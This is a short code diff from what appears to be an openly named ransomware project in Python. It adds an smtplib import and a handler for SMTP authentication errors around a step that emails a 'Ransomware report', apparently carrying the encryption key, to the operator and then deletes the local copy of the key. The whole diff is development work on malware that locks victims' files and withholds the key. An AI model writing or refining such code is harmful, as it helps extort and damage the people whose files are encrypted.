@@ -10,6 +10,7 @@ from PIL import ImageTk, Image
 from threading import Thread
 import subprocess
 import json
+import smtplib
 
 import setup
 import modules.cryptography
@@ -120,6 +121,8 @@ class Ransomware:
             modules.send_email.send_mail(self.user_email, self.user_password, message_body, 'Ransomware report')
 
             self.remove_copy_of_key(main_dir)
+        except smtplib.SMTPAuthenticationError:
+            return
         except:
             self.handle_mail(key, passwd)
 
